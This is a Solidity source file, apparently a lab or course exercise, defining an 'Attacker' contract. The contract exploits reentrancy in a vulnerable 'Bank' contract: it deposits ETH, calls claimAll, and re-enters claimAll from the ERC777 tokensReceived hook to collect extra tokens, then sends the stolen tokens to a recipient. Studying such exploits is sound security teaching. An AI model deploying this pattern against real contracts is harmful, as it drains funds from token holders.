// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "./Bank.sol";

contract Attacker is AccessControl, IERC777Recipient {
    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");

    IERC1820Registry private _erc1820 = IERC1820Registry(
        0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
    );

    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH =
        keccak256("ERC777TokensRecipient");

    uint8 public depth = 0;
    uint8 public max_depth = 2;

    Bank public bank;

    event Deposit(uint256 amount);
    event Recurse(uint8 depth);

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ATTACKER_ROLE, admin);

        // Register this contract as ERC777TokensRecipient
        _erc1820.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
        bank = Bank(bank_address);
        _grantRole(ATTACKER_ROLE, address(this));
        _grantRole(ATTACKER_ROLE, address(bank.token()));
    }

    /*
        The main attack function that should start the reentrancy attack
        amt is the amt of ETH the attacker will deposit initially to start the attack
    */
    function attack(uint256 amt) external payable onlyRole(ATTACKER_ROLE) {
        require(address(bank) != address(0), "Target bank not set");
        require(msg.value == amt, "Incorrect ETH amount sent");

        // Step 1: Deposit ETH to Bank contract
        bank.deposit{value: amt}();
        emit Deposit(amt);

        // Step 2: Call vulnerable function to trigger reentrancy
        bank.claimAll();
    }

    /*
        After the attack, this contract has a lot of (stolen) MCITR tokens
        This function sends those tokens to the target recipient
    */
    function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
        ERC777 token = bank.token();
        token.send(recipient, token.balanceOf(address(this)), "");
    }

    /*
        This is the function that gets called when the Bank contract sends MCITR tokens
    */
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        // Only recurse if not exceeded max depth
        if (depth < max_depth) {
            depth++;
            emit Recurse(depth);
            bank.claimAll(); // Re-enter the vulnerable function
        }
    }
}
